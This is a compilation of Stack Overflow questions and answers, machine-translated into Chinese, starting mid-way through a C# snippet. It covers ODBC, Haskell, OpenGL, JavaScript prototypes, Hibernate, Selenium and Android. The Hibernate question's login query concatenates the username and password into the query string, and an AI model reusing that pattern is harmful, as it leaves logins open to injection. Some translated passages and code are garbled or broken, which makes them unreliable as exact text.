        l.Add(new KeyValuePair<int, string>(10, "Parmak İzi ve Kart"));
        l.Add(new KeyValuePair<int, string>(11, "Şifre ve Kart"));
        l.Add(new KeyValuePair<int, string>(12, "Parmak İzi, Şifre ve Kart"));
        l.Add(new KeyValuePair<int, string>(13, "PIN, Parmak İzi ve Şifre"));
        l.Add(new KeyValuePair<int, string>(14, "Parmak İzi ve Kart veya Parmak İzi ve PIN"));
        CBdogrulama.DataSource = l;
        CBdogrulama.ValueMember = "Key";//important key is int data type
        CBdogrulama.DisplayMember = "Value"; 
    } 
```

下面不正确

CBdogrulama.SelectedValue = g[2];//这行赋值空值不能g[2]

低于正确（低于代码赋值（解决空问题））

CBdogrulama.SelectedValue = Convert.ToInt32(g[2]);

# c# - OdbcConnection.GetSchema 与 SQLGetInfo

> ID：14379184
> 
> 赞同：1
> 
> 时间：2013-01-17T12:31:27.973
> 
> 标签：c#, .net, odbc

我有一些旧的 ODBC 连接编码，它使用 SQLGetInfo 函数在请求时收集各种连接详细信息。该代码目前正在重构为 .NET，但是它仍然需要保持少量的向后兼容性，直到其余区域也重构为 .NET

我需要能够使用 c# OdbcConnection.GetSchema() 重现以下 c++ 代码

```
char strInstanceName[200];
SQLSMALLINT lengthReturned;
SQLGetInfo(myhInstance, SQL_SERVER_NAME, strInstanceName, 200, &lengthReturned);

char strDSN[200];
SQLSMALLINT lengthReturned;
SQLGetInfo(myhInstance, SQL_DATA_SOURCE_NAME, strDSN, 200, &lengthReturned);

char strActiveStmts[200];
SQLSMALLINT lengthReturned;
SQLGetInfo(myhInstance, SQL_ACTIVE_STATEMENTS, strActiveStmts, 200, &lengthReturned);

char strActiveConns[200];
SQLSMALLINT lengthReturned;
SQLGetInfo(myhInstance, SQL_ACTIVE_CONNECTIONS, strActiveConns, 200, &lengthReturned); 
```

我花了几个小时查看文档并搜索网络，但我无法找到或理解使用 OdbcConnection.GetSchema() 的等价物，即使文档和网络让我相信这是获取的功能所有这些信息。

示例代码会很好:)

致敬 DIG

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-23T10:00:45.143

通过 MSDN 论坛回答。

基本上，我需要的信息无法通过 .NET 框架获得，我需要使用 InteropServices 和 DllImport 在 c# 中直接调用 ODBC API。

[http://social.msdn.microsoft.com/Forums/en-US/netfxbcl/thread/4579ccbc-4977-493e-a863-94ecdfe181b4/#9d74fc73-7be9-482b-b6db-1b4c256cb355](http://social.msdn.microsoft.com/Forums/en-US/netfxbcl/thread/4579ccbc-4977-493e-a863-94ecdfe181b4/#9d74fc73-7be9-482b-b6db-1b4c256cb355)

挖的

# unit-testing - 函数隐私和单元测试 Haskell

> ID：14379185
> 
> 赞同：46
> 
> 时间：2013-01-17T12:31:28.277
> 
> 标签：unit-testing, haskell, private-methods

您如何处理 Haskell 中的功能可见性和单元测试？

如果您导出模块中的每个函数以便单元测试可以访问它们，那么您可能会冒着其他人调用不应在公共 API 中的函数的风险。

我想过使用`{-# LANGUAGE CPP #-}`然后用一个围绕出口`#ifdef`：

```
{-# LANGUAGE CPP #-}

module SomeModule
#ifndef TESTING
( export1
, export2
)
#endif
where 
```

有没有更好的办法？

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2013-01-17T12:44:44.360

通常的约定是将您的模块分成公共和私有部分，即

```
module SomeModule.Internal where

-- ... exports all private methods 
```

然后是公共 API

```
module SomeModule where (export1, export2)

import SomeModule.Internal 
```

`SomeModule.Internal`然后，您可以在测试和其他对访问内部实现至关重要的地方导入。

这个想法是您的库的用户永远不会*意外*调用私有 API，但如果知道他们在做什么（调试等） ，他们*可以使用它。*与强制隐藏私有 API 相比，这大大提高了库的可用性。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-01-17T12:49:37.473

对于测试，您通常在[cabal](http://www.haskell.org/cabal/)项目文件中将应用程序拆分为库、生产可执行文件和测试库函数的[测试套件](http://www.haskell.org/cabal/users-guide/developing-packages.html#test-suites)可执行文件，因此测试断言函数是分开的。

对于外部函数可见性，您将库模块拆分为“exposed-modules”部分和“other-modules”部分。

# multithreading - glXSwapBuffers 阻塞直到新的 X 事件被触发

> ID：14379187
> 
> 赞同：1
> 
> 时间：2013-01-17T12:31:37.583
> 
> 标签：multithreading, qt, opengl, x11

我们的软件中有一个非常奇怪的错误。glXSwapBuffers 的调用将不时阻塞，直到发送一些 X 事件（鼠标悬停在窗口/键盘事件上）。似乎该错误与从未正确解决的[从 swapBuffers() 上的线程块渲染的 Qt QGLWidget OpenGL相同。](https://stackoverflow.com/questions/8028108/qt-qglwidget-opengl-rendering-from-thread-blocks-on-swapbuffers)我们有同样的情况。

在我们的应用程序中，我们创建了多个窗口，因为我们的应用程序需要使用多个屏幕。我们的每个窗口基本上都是 QWidget，它有一个从 QGLWidget 派生的类作为它的唯一子级。每个窗口都有自己的渲染线程，它执行 OpenGL 命令。

在这种情况下，应用程序只是不时停止。如果我们向它提供 X 事件（将鼠标移到窗口上/按下键盘按钮），它会正常继续。基于调试器信息 glXSwapBuffers() 块在封闭的驱动程序代码中的某处。

我们尚未在 NVidia 卡上确认此行为，仅在 AMD 卡上出现，并且在使用多个 AMD 卡时更有可能出现。这表明该错误可能来自 GPU 驱动程序。

我想知道有没有其他人遇到过这个问题，甚至有人设法解决了这个问题。

# html - 破解 Clang 的重写器？

> ID：14379189
> 
> 赞同：0
> 
> 时间：2013-01-17T12:31:41.127
> 
> 标签：html, clang, mediawiki

[MediaWiki 格式](http://www.mediawiki.org/wiki/Help%3aFormatting)复杂，结合了各种范式和语法，据说没有 php 和 MediaWiki 本身就无法转换。

是否可以通过 Clang Rewriter 上的黑客攻击将 MediaWiki 文本重写为 HTML？Clang 会以某种方式被黑客入侵以递归地插入这些模板吗？

编辑：我并不期待完美的结果，只是想知道这是否合理。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T15:21:30.987

I doubt Clang would be helpful; it really, really, wants to be compiler for C-like languages. In particular, I understand it has a hand-written parser for C/C++/ObjectiveC, and I doubt that it would make any sense to try to bend that parser. After parsing, you need to represent the program; Clang's AST classes are really, really intended to model its target languages.

I think what you want is a program transformation system. These tools are designed to let you provide grammars for arbitrary languages, and use source-to-source rewrites to make changes.

Our DMS Software Reengineering Toolkit is one of these. It provides very strong parsing support; it can parse a wide variety languages including IBM COBOL, Java, HTML, C++, and Verilog to give an idea of its span. It accepts multiple language definitions at once; this allows you write source-to-source transformations that map one language to another, which seems to be what you want to do. (The source-to-source transformations idea works pretty well, and other PTS are pure source-to-source, but as a practical matter, implementing a translation tool with pure s-to-s is a little awkward; because not everything you need to do is rewrite. DMS combines procedural code to compute inferences and s-to-s to achieve its effects).

Building a real translator for complex circumstances (as you seem to want to do) isn't easy even with PTS. Just a lot more practical than trying to bend the wrong machinery to the job.

As other commenters have observed, you also have the additional task of reverse-engineering the actual mapping from MediaWiki input to HTML.

# sql-server - Delphi 和 MS SQL 应用角色

> ID：14379191
> 
> 赞同：2
> 
> 时间：2013-01-17T12:31:45.807
> 
> 标签：sql-server, delphi, stored-procedures, ado, vcl

有人可以解释（逐步）如何使用 Delphi 中的应用程序角色（ADO 组件）连接到一些 MSSQL DB 吗？我已经在 MSSQL DB 和应用程序角色中创建了一个用户，但是`sp_setapprole`从 Delphi 应用程序调用存储过程对我不起作用..

据我所知，我可能从一开始就犯了很多错误，所以我会很感激从一开始就提供详细的说明。

调用 sp：

```
ADOStoredProc1->Parameters->ParamByName("@rolename")->Value = "test";
ADOStoredProc1->Parameters->ParamByName("@password")->Value = "test";
ADOStoredProc1->ExecProc();
ShowMessage(ADOStoredProc1->Parameters->ParamByName("@RETURN_VALUE")->Value); //0 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T14:28:38.970

我发现了问题。我在调用存储过程之前打开了数据集，这就是它不起作用的原因。现在好啦。感谢 whosrdady 试图提供帮助:)

# geometry - 如何找到形成由 x 轴限制的圆的切线的两点的坐标（作为自然数）？

> ID：14379193
> 
> 赞同：0
> 
> 时间：2013-01-17T12:31:53.643
> 
> 标签：geometry, coordinates, points

[坐标为 (P x] , P [y] ) 和 (Q [x] , Q [y] ) 的两点 P 和 Q满足以下性质：

1.  坐标 P [x]、 P [y]、 Q [x]和 Q [y]是整数。
2.  P [x] = -Q [x]。
3.  直线 PQ 与一个圆心为 (0, 0) 且半径为*r的圆相切*
4.  0 < P [x] ≤ *a*对于某个整数限制*a*。

如何找到所有这样的点 P 和 Q 对？

例如，在下图中，我有一个半径*r* =2 且极限*a* = 6 的圆。点对 P = (6, 2) 和 Q = (−6, −7) 是一个解，因为：

1.  P 和 Q 的坐标是整数。
2.  P [x] = -Q [x]。
3.  线 PQ 与圆相切。
4.  0 < P [x] ≤ 6。

但这只是一对。我需要找到所有这样的对。有有限数量的解决方案。

![](../Images/39ef11f60a6fe66430e0b14c2d07a0d0.png)

那么，有没有办法检查点的坐标是否与圆相切并且是整数，然后将它们全部列出？我已经查看了斜率方程和从圆心到直线方程的最短路径，但是，在第一种情况下，它需要知道坐标（我可以通过强制每个数字来做到这一点，但我看不到模式，因为我的直觉告诉我应该应用某种方程），在第二种情况下，我必须知道斜率方程。

这是我想出的算法，但我认为它不正确或不够好：

1.  对于所有 1 ≤ P [x] ≤ *a*和 -<em>a ≤ Q [x] ≤ -1，求斜率方程*y* = *mx* + *b 。*
**   对于每个*y* = *mx* + *b*检查它是否与圆相切（如何做到这一点？？？）*   如果为真，则返回该对*

 ** * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T11:50:29.543

线 PQ 有方程：

```
(x-Px)/(Qx-Px)=(y-Py)/(Qy-Py) or

(x-Px)*(Qy-Py)-(y-Py)*(Qx-Px)=0 or

x*(Qy-Py)+y*(Px-Qx)-Px*Qy+Px*Py+Py*Qx-Py*Px = 

x*(Qy-Py)+y*2*Px-Px*(Qy+Py)=0 
```

从零点到这条线的距离（圆半径）是

```
r=Px*(Qy+Py)/Sqrt((2*Px)^2+(Qy-Py)^2) 
```

请注意，半径和提名者是整数，因此分母也必须是整数。当 2*Px 和 |Qy-Py| 时是可能的 是一些[毕达哥拉斯三元组](http://en.wikipedia.org/wiki/Pythagorean_triple)的成员（例如 - 12^2+9^2 =15^2）。因此您可以使用上述链接中的“生成三元组”方法来显着减少搜索并找到所有可能的点对（带半径检查）

```
 Px = k * m * n   (for m>=n, radius < k*m*n <= a)
  |Qy-Py| = k * (m^2 - n^2) 
```

使用 a=6 最大值 n 为 2，您的示例对应于 (k, m, n) 集 (3, 2, 1)*

# .net - SurrogateSelector 似乎仅适用于根对象

> ID：14379195
> 
> 赞同：0
> 
> 时间：2013-01-17T12:32:03.403
> 
> 标签：.net, serialization, binary-serialization

我尝试使用 SurrogatSelector 来自定义流的反序列化。它适用于对象图的根对象，但不适用于包含的对象。请参阅以下代码：

```
 Stream stream = File.Open("C:\\Temp\\test.bin", FileMode.Create);
        BinaryFormatter formatter = new BinaryFormatter();
        TestToSerialize tts = new TestToSerialize();
        formatter.Serialize(stream, tts);
        stream.Close();

        stream = File.Open("C:\\Temp\\test.bin", FileMode.Open);
        formatter = new BinaryFormatter();
        SurrogateSelector ss = new SurrogateSelector();
        ss.AddSurrogate(typeof(string), new StreamingContext(StreamingContextStates.All), new StringSerializationSurrogate());
        formatter.SurrogateSelector = ss;
        tts = (TestToSerialize)formatter.Deserialize(stream);
        stream.Close(); 
```

StringSerializationSurrogate 在反序列化字符串时调用（方法 SetObjectData），但在反序列化包含字符串（作为可序列化成员）的对象时不调用。要序列化/反序列化的对象如下所示：

```
 [Serializable]
   class TestToSerialize
   {
       public string s1;
       public TestToSerialize()
       {
           s1 = "some test";
       }
   } 
```

有没有办法让代理在非根对象上被调用？为了完整起见，代理看起来像这样（测试代码仅用于设置断点）：

```
sealed class StringSerializationSurrogate : ISerializationSurrogate
{

    public void GetObjectData(Object obj, SerializationInfo info, StreamingContext context)
    {
    }

    public object SetObjectData(object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector)
    {
        string s = (String)obj;
        return obj;
    }
} 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-05-21T03:33:56.217

A surrogate will definitely be called on non-root objects - I regularly use it for exactly that in my own code.

I don't think String is a good Type to be using for your test.

# android - 如何在偏好活动中添加自定义布局？

> ID：14379202
> 
> 赞同：1
> 
> 时间：2013-01-17T12:32:26.397
> 
> 标签：android, android-layout, android-preferences

> **可能重复：**
> [如何向 PreferenceScreen 添加按钮](https://stackoverflow.com/questions/2697233/how-to-add-a-button-to-preferencescreen)

我想在首选项活动的底部添加自定义视图，并且还想实现屏幕中添加的视图的 onClick？当我尝试在首选项屏幕中使用布局充气器添加视图时，它始终位于首选项视图的顶部。但我想在首选项屏幕的底部显示我的视图。

下面是在偏好活动中添加布局的代码片段。

```
LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
View view = inflater.inflate(R.layout.bottom_preference, null, true);
RelativeLayout.LayoutParams rl=new RelativeLayout.LayoutParams(android.widget.RelativeLayout.LayoutParams.MATCH_PARENT,android.widget.RelativeLayout.LayoutParams.MATCH_PARENT);
rl.addRule(RelativeLayout.ALIGN_PARENT_BOTTOM);
addContentView(view,rl); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:39:43.577

尝试这个：

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    RelativeLayout parent = new RelativeLayout(this);

    Button button = new Button(this);
    RelativeLayout.LayoutParams params = (RelativeLayout.LayoutParams) generateLayoutParams(null);
    params.setMargins(35, 35, 0, 0);
    params.addRule(RelativeLayout.ALIGN_BOTTOM);
    button.setLayoutParams(params);

    parent.addView(button);

    setContentView(rl);
} 
```

# asp.net - query

The below code displays a table with the first column of each row displaying the desc. I want the user to be able to enter text into the 2nd column of each row, this works for the code below, but i

ID：14379206

赞同：0

时间：2013-01-17T12:32:34.547

标签：asp.net, html-table, textarea

# javascript - Javascript原型继承和对象属性阴影

> ID：14379208
> 
> 赞同：8
> 
> 时间：2013-01-17T12:32:48.620
> 
> 标签：javascript, prototypal-inheritance

```
var person = { name :"dummy", personal_details: { age : 22, country : "USA" } };

var bob = Object.create(person);

bob.name = "bob";
bob.personal_details.age = 23;

console.log(bob.personal_details === person.personal_details);
// true : since it does not shadow object of prototype object

console.log(bob.name  === person.name);
// false : since it shadows name

////now
bob.personal_details  = {a:1};
console.log(bob.personal_details === person.personal_details); 
```

//错误的

当对象***bob***试图覆盖***person的“*** ***name*** ”属性时，它会在 bob 本身中被遮蔽。

 *但是在**personal_details**的情况下，同样的规则被违反了。

我很想知道为什么会这样？？

**这是 jsbin 的链接：http: [//jsbin.com/asuzev/1/edit](http://jsbin.com/asuzev/1/edit)**

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-01-17T13:20:56.450

用几个例子可以很容易地说明正在发生的事情：

### 通过原型链访问personal_details

```
var person = { name :"dummy", personal_details: { age : 22, country : "USA" } }
var bob = Object.create(person)

bob.name = "bob"
bob.personal_details.age = 23 
```

输出如下：

```
console.log( bob );
/// { name :"bob", personal_details: { age : 23, country : "USA" } }

console.log( person )
/// { name :"dummy", personal_details: { age : 23, country : "USA" } } 
```

现在在 person 对象上设置的 Age 23 是通过 bob 的原型链`because bob.personal_details`直接引用的。`person.personal_details`向下导航对象结构后，您将直接使用该`person.personal_details`对象。

### 用本地属性覆盖原型属性

但是，如果您`personal_details`用另一个对象覆盖 bob 的属性，则该原型链接将被更本地的属性覆盖。

```
bob.personal_details = { a: 123 } 
```

现在输出是：

```
console.log( bob );
/// { name :"bob", personal_details: { a : 123 } }

console.log( person )
/// { name :"dummy", personal_details: { age : 23, country : "USA" } } 
```

因此，通过访问`bob.personal_details`——从现在开始——你引用的是`{ a: 123 }`对象而不是 person 的原始`{ age : 23, country : "USA" }`对象。`bob`所做的所有更改都将发生在该对象上，并且基本上与该对象无关`person`。

### 原型链

为了让事情变得有趣，你认为当你这样做时会发生什么，毕竟以上：

```
delete bob.personal_details 
```

您最终恢复了原始原型链接`person.personal_details`（因为您已删除添加的本地属性），因此控制台日志将显示：

```
console.log( bob );
/// { name :"bob", personal_details: { age : 23, country : "USA" } } 
```

基本上，JavaScript 引擎将沿着原型链返回，直到找到您在每个原型对象上请求的属性或方法。一个项目设置得越靠前，意味着它将在以后覆盖其他项目。

现在另一个问题，如果您再次触发以下命令会发生什么？

```
delete bob.personal_details 
```

什么都没有，不再有一个实际的属性分配给 bob 调用`personal_details`，`delete`只会在当前对象上工作，而不是沿着原型链。

### 一种不同的看待它的方式

查看原型链如何工作的另一种方法基本上是想象一堆对象。当 JavaScript 扫描特定的属性或方法时，它会向下读取以下结构：

```
bob :          {  }
  person :     { name: 'dummy', personal_details: { age: 22 } }
    Object :   { toString: function(){ return '[Object object]'; } } 
```

例如，假设我想访问`bob.toString`. `toString`是一种存在于 JavaScript 基础对象上的方法，`Object`它是几乎所有东西的基础原型。当解释器收到对对象上特定方法或属性的读取请求时，它将遵循以下事件链：

1.  有`bob`一个属性叫? **不。**`toString`
***   `bob.__proto__`ie是否`person`有一个名为 的属性`toString`？**不。***   `bob.__proto__.__proto__`ie是否`Object`有一个名为 的属性`toString`？**是的***   返回参考`function(){ return '[Object object]'; }`**

 **一旦到达第 4 点，解释器将返回对`toString`在 Object 上找到的方法的引用。如果未在*未定义属性*`Object`的错误上找到该属性，则很可能已被触发（因为它是链中的最后一个）。

 *现在如果我们以之前的例子为例，这次`toString`在 - 上定义一个方法`bob`：

```
bob :          { toString: function(){ return '[Bob]'; } }
  person :     { name: 'dummy', personal_details: { age: 22 } }
    Object :   { toString: function(){ return '[Object object]'; } } 
```

如果我们再次尝试读取`toString`bob 上的方法，这次我们得到：

1.  有`bob`一个属性叫? **是的。**`toString`

 **该过程在第一个障碍处停止并`toString`从 bob 返回方法。这意味着`bob.toString()`将返回`[Bob]`而不是`[Object object]`.

正如 Phant0m 所说，对对象的写入请求遵循不同的路径，并且永远不会沿着原型链向下传播。理解这一点是为了弄清楚什么是读请求和什么是写请求之间的区别。

```
bob.toString                   --- is a read request
bob.toString = function(){}    --- is a write request
bob.personal_details           --- is a read request
bob.personal_details = {}      --- is a write request
bob.personal_details.age = 123 --- is a read request, then a write request. 
```

最后一项是引起混乱的一项。该过程将遵循以下路线：

1.  有`bob`一个属性叫? **不。**`personal_details`
***   有`person`一个属性叫? **是的。**`personal_details`***   返回`{ age: 22 }`存储在内存中某处的引用。****

 ****现在开始一个新的过程，因为对象导航或赋值的每个部分都是对属性或方法的新请求。所以，现在我们有了我们的`personal_details`对象，我们切换到一个写请求，因为等号左边的属性或变量`=`总是一个赋值。

1.  将值写入对象`123`的属性`age``{ age: 22 }`

所以原始请求可以被看作是这样的：

```
(bob.personal_details)            --- read
    (personal_details.age = 123)  --- write 
```

如果`bob`拥有它自己`personal_details`的进程属性将是相同的，但被写入的目标对象将是不同的。

### 最后...

按照你的问题的思路：

> 很难理解原型对象上的属性被视为 READ_ONLY，但如果属性是一个对象，那么人们可以掌握它并可以自由修改其属性！我的理解对吗？

原型属性似乎是只读的，但只有在作为继承它们的对象的属性直接访问时——因为这些属性实际上根本不存在于继承对象上。如果您向下导航到原型对象本身，则可以将其视为任何普通对象*（具有读取和写入功能）*，因为这正是它的本质——普通对象。一开始可能会令人困惑，但这是本质或原型继承，它与您如何访问正在使用的属性有关。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-17T12:39:09.607

在第二种情况下，您没有分配给 的属性`bob`，那么您如何覆盖它呢？

在 的情况下`bob.name = "bob"`，您绑定了 bob*自己的*name 属性。

在第二种情况下，你*没有*。`personal_details`您可以通过原型访问 bob 的属性。然后，您分配给该对象的属性，到那时所有连接都将`bob`丢失。

可以这样想：

```
bob.personal_details.age = 23;
// equivalent
expr = bob.personal_details;
expr.age = 23; // As you can see, there's no assignment to bob 
```

它不违反任何规则，因为情况完全不同。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-17T13:16:18.310

我希望下面的图表足够清楚，但我会尽量简单地解释发生了什么。

当您创建新对象时，`Object.create`您会使用原型方法的第一个参数创建一个对象`create`。因此，您`bob`使用指向`person`对象的原型创建。的所有属性`person`都可以`bob`通过对其原型的引用来访问。

在下一张图片中，您更改了`bob`的名字。现在`bob`很简单，您可以创建新名称`slot`或名称（现在解释器在查找属性时不会检查原型链，它会直接发现 bob 具有这样的属性）。`property``bob``name``name`

在第三个中，您将其更改`bob.personal_details.age`为影响到，`person.personal_details.age`因为这只是同一个对象。

最后你设置了属性`personal_details`，现在`bob`有了 slot `personal_details`，它不是原型属性，它是对另一个对象的引用——匿名对象。

![在此处输入图像描述](../Images/d51df250d07c1fcbac9b60ea52077c21.png)**********

# java - Hibernate 返回查询结果

> ID：14379209
> 
> 赞同：0
> 
> 时间：2013-01-17T12:32:55.217
> 
> 标签：java, hibernate, jsp

```
 public Users loginUser(String username,String password)
{
    Users user;
    org.hibernate.Transaction tx = session.beginTransaction();
    Query q = session.createQuery("from Users as users where Username ="+ username + " && Password = " +password);
    user = (Users) q.uniqueResult();
    return user;
} 
```

我正在尝试返回尝试登录的用户，但它在调用上述方法的行中给了我一个错误。

```
org.apache.jasper.JasperException: An exception occurred processing JSP page /loginlogout.jsp at line 21 
```

堆栈跟踪：

```
Stacktrace:
    org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:568)
    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:470)
    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    org.netbeans.modules.web.monitor.server.MonitorFilter.doFilter(MonitorFilter.java:393) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:41:48.730

我认为您可以尝试以下查询：

```
Query q = session.createQuery("from Users as users where users.Username=:username and users.Password=:password") ; 
```

# asp.net-mvc-4 - 如何在 Web 服务器上运行 VS 2012 的 MVC 4？

> ID：14379211
> 
> 赞同：0
> 
> 时间：2013-01-17T12:32:59.197
> 
> 标签：asp.net-mvc-4

我有一个 MVC 4 应用程序并且在我的本地机器上运行良好。我必须在 Visual Studio 2012 中进一步做什么才能在 Web 服务器中运行我的网站？我是否必须通过 VS 2012 制作一些文件才能在 Web 服务器中部署网站？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:49:40.193

您无需在 Visual Studio 中执行任何特定操作。

*   确保您的服务器上安装了 .net 4.0 和 MVC。
*   将您的应用程序池配置为与您的 Webapp(x86, x64) 相同的架构。
*   更改您的 web.config
*   在您的 ISS 上创建一个虚拟目录/应用程序。
*   配置您的应用程序的身份验证选项（可能您需要匿名和表单）

当您发布/构建您的网站时，您可以将整个内容复制到您的 IIS 目录，它应该可以工作。

# c++ - opencv/c++我如何只检测之前检测到的正方形区域内的关键点

> ID：14379212
> 
> 赞同：1
> 
> 时间：2013-01-17T12:32:59.777
> 
> 标签：c++, opencv, computer-vision

我正在做我的项目，但我遇到的一个问题是我不知道如何只从之前检测过的正方形区域中检测关键点。下面是我的演示，到目前为止，我的代码将检测正方形内外的关键点：[https ://www.youtube.com/watch?feature=player_embedded&v=3U8V6PhMnZ8](https://www.youtube.com/watch?feature=player_embedded&v=3U8V6PhMnZ8)

这是我找到正方形的代码：

```
 const int threshold_level = 2;
    for (int l = 0; l < threshold_level; l++)
    {

        gray = gray0 >= (l+1) * 255 / threshold_level;

        // Find contours and store them in a list
        findContours(gray, contours, CV_RETR_LIST, CV_CHAIN_APPROX_SIMPLE);

        // Test contours
        vector<Point> approx;
        for (size_t i = 0; i < contours.size(); i++)
        {
                // approximate contour with accuracy proportional
                // to the contour perimeter
                approxPolyDP(Mat(contours[i]), approx, arcLength(Mat(contours[i]), true)*0.02, true);

                // Note: absolute value of an area is used because
                // area may be positive or negative - in accordance with the
                // contour orientation
                if (approx.size() == 4 &&
                        fabs(contourArea(Mat(approx))) > 3000 &&
                        isContourConvex(Mat(approx)))
                {
                        double maxCosine = 0;

                        for (int j = 2; j < 5; j++)
                        {
                                double cosine = fabs(angle(approx[j%4], approx[j-2], approx[j-1]));
                                maxCosine = MAX(maxCosine, cosine);
                        }

                        if (maxCosine < 0.3)
                                squares.push_back(approx);
                }
        }
    } 
```

这是我绘制正方形和角点的代码：

```
 const Point* p = &squares[i][0];
        int n = (int)squares[i].size();       
        Point p1 = squares[i][0];
        Point p2 = squares[i][1];
        Point p3 = squares[i][2];
        Point p4 = squares[i][3];
        cout<<"p1 is "<<p1<<" p2 is "<<p2<<" p3 is "<<p3<<" p4 is "<<p4<<endl;
        circle(image, squares[i][0], 3, Scalar(0,0,255), 5, 8, 0);
        circle(image, squares[i][1], 3, Scalar(0,255,255), 5, 8, 0);
        circle(image, squares[i][2], 3, Scalar(255,0,255), 5, 8, 0);
        circle(image, squares[i][3], 3, Scalar(255,255,0), 5, 8, 0);

        polylines(image, &p, &n, 1, true, Scalar(0,255,0), 3, CV_AA); 
```

这是我检测关键点的代码：

```
 Mat gray_image;
    vector<KeyPoint> keyPoints; 
    cvtColor(image, gray_image, CV_BGR2GRAY); 
    FastFeatureDetector fast(60); 
    fast.detect(gray_image,keyPoints);  
    drawKeypoints(image, keyPoints,image, Scalar::all(255), DrawMatchesFlags::DRAW_OVER_OUTIMG); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:56:58.030

您有两种可能的解决方案：

1.  检测所有关键点，然后检查它们是否在正方形内。
2.  从图像中裁剪正方形以生成新图像，然后在那里检测关键点。

干杯，

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:37:18.493

您可以使用裁剪图像

矩形 r(left,top,width,height); // 我们感兴趣的部分图片

Mat roi(fullImage, r); // 将创建对原始图像的矩形 r 的引用。请注意，它不是副本。

# python - python中的硒和多处理

> ID：14379218
> 
> 赞同：2
> 
> 时间：2013-01-17T12:33:11.420
> 
> 标签：python, django, selenium, multiprocessing

在我的 django 应用程序中，我使用 selenium 来抓取和解析一些 html 页面。我试图引入多进程来提高性能。这是我的代码：

```
import os
from selenium import webdriver
from multiprocessing import Pool

os.environ["DISPLAY"]=":56017"

def render_js(url):
    driver = webdriver.Firefox()
    driver.set_page_load_timeout(300)
    driver.get(url)
    text = driver.page_source
    driver.quit()
    return text

def parsing(url):
    text = render_js(url)
    ... parsing the text ....
    ... write in db.... 

url_list = ['www.google.com','www.python.com','www.microsoft.com']
pool = Pool(processes=2)
pool.map_async(parsing, url_list)
pool.close()
pool.join() 
```

当两个进程同时工作并使用 selenium 时出现此错误：第一个进程使用“www.google.it”启动 firefox 并返回正确的文本，第二个使用 url“www.python.com”返回 www 的文本.google.it 而不是 www.python.com。你能告诉我哪里错了吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2018-01-30T09:39:40.323

```
from selenium import webdriver
from multiprocessing import Pool

def parsing(url):
    driver = webdriver.Chrome()
    driver.set_page_load_timeout(300)
    driver.get(url)
    text = driver.page_source
    driver.close()
    return text

url_list = ['http://www.google.com', 'http://www.python.com']
pool = Pool(processes=4)
ret = pool.map(parsing, url_list)
for text in ret:
    print text[:30] 
```

我尝试运行您的代码，但 Selenium 抱怨 URL 错误。添加`http://`到它使其工作。

# ios - 使用 Phonegap 实现 VOIP

> ID：14379220
> 
> 赞同：2
> 
> 时间：2013-01-17T12:33:15.377
> 
> 标签：ios, cordova, voip

我目前有一个使用 PhoneGap 创建的应用程序，仅在 IOS 上运行，未来计划可能提供多平台功能。我正在尝试仅通过内部网络在我的应用程序中实现 VOIP 功能（如对讲机）。我尝试探索 Phono 但无济于事，因为它需要我连接到互联网。我还有什么其他选择？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-29T23:00:10.133

您需要做的是在本机中实现您的 VOIP 功能，然后为 PhoneGap 制作一个自定义插件，以便您的 HTML5 应用程序可以与本机代码进行通信。

如果您不想自己编写所有内容，可以使用 Twilio 客户端。他们有适用于 iOS 和 Android 的 API

[http://www.twilio.com/client/mobile](http://www.twilio.com/client/mobile)

要为 PhoneGap 制作自定义插件，请查看：

[http://docs.phonegap.com/en/2.3.0/guide_plugin-development_index.md.html](http://docs.phonegap.com/en/2.3.0/guide_plugin-development_index.md.html)

* * *

另一种选择是使用 WEBRTC：

[http://www.webrtc.org/](http://www.webrtc.org/)

# android - 图像未使用 Html.fromhtml 在 textview 中显示

> ID：14379227
> 
> 赞同：1
> 
> 时间：2013-01-17T12:33:27.650
> 
> 标签：android, image, textview

我的 HTML 字符串如下

```
String htmlstr=" This is my image <img src='/sdcard/pic1.jpg' /> and the my second image is <img src='/sdcard/pic2.jpg' />" 
```

我在用

```
txtimg.setText(Html.fromHtml(htmlstr)); 
```

但问题是它显示 1 个默认的绿色小方块而不是图像

请帮我显示图像

提前致谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-17T13:07:35.867

尝试这个 ：

```
final String path = Environment.getExternalStorageDirectory().getAbsolutePath()+"/test.jpg";

ImageGetter imageGetter = new ImageGetter() {
    public Drawable getDrawable(String source) {
        Drawable d = Drawable.createFromPath(path);
        d.setBounds(0, 0, d.getIntrinsicWidth(), d.getIntrinsicHeight());
        return d;
    }
};

Spanned htmlstr= Html.fromHtml("<img src='" + path + "'/>", imageGetter, null);
TextView out_unit1 = (TextView) findViewById(R.id.mTxtViewCm2);
out_unit1.setText(htmlstr); 
```

这对我来说很有用。

谢谢。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-17T13:32:37.160

它对我有用如下

```
txtimg.setText(Html.fromHtml(htmlstr, new ImageGetter() {                 
                @Override
